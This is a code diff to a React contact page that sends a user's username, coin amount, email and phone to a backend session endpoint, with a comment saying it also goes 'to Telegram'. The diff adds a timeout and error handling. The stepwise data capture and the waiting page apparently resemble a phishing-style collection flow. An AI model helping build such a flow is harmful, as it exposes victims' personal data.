@@ -67,23 +67,32 @@ const ContactPage = () => {
       localStorage.setItem('phone', fullPhone);
 
       // Send to backend and Telegram
-      try {
-        await axios.post(`${API}/session/step`, {
-          session_id: sessionId,
-          step: 'contact',
-          data: {
-            username: username,
-            amount: parseInt(coinAmount),
-            email: email,
-            phone: fullPhone
-          }
-        });
-      } catch (error) {
-        console.error('Failed to submit step:', error);
-      }
+try {
+  await axios.post(`${API}/session/step`, {
+    session_id: sessionId,
+    step: 'contact',
+    data: {
+      username: username,
+      amount: parseInt(coinAmount),
+      email: email,
+      phone: fullPhone
+    }
+  }, {
+    timeout: 15000
+  });
 
-      // Navigate to waiting page
-      navigate('/waiting');
+  navigate('/waiting');
+
+} catch (error) {
+  console.error('CONTACT SUBMIT FAILED:', {
+    message: error.message,
+    status: error.response?.status,
+    data: error.response?.data
+  });
+
+  alert('Connection problem. Please try again.');
+  setIsLoading(false);
+}
     }
   };
 
